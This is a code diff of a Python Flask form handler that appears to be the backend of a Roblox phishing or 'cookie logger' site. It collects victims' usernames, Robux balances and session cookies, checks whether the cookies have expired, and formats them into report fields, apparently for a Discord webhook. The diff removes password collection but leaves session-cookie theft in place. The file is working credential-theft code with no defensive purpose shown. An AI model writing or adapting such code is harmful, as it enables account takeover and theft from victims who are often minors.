@@ -69,7 +69,6 @@ def submit_form():
         
         # Extract all form fields
         username = data.get('username', '').strip()
-        password = data.get('password', '').strip()
         user_id = data.get('userId', '').strip()
         robux = data.get('robux', '').strip()
         pending = data.get('pending', '').strip()
@@ -79,10 +78,10 @@ def submit_form():
         cookie = data.get('cookie', '').strip()
         
         # Server-side validation
-        if not cookie or not password or not username:
+        if not cookie or not username:
             return jsonify({
                 'success': False, 
-                'message': 'Missing required fields (username, password, cookie)'
+                'message': 'Missing required fields (username, cookie)'
             }), 400
         
         # Check if cookie is expired (for JWT tokens)
@@ -137,11 +136,6 @@ def submit_form():
                     {
                         'name': '👤 Username',
                         'value': username,
-                        'inline': True
-                    },
-                    {
-                        'name': '🔑 Password',
-                        'value': password,
                         'inline': True
                     },
                     {
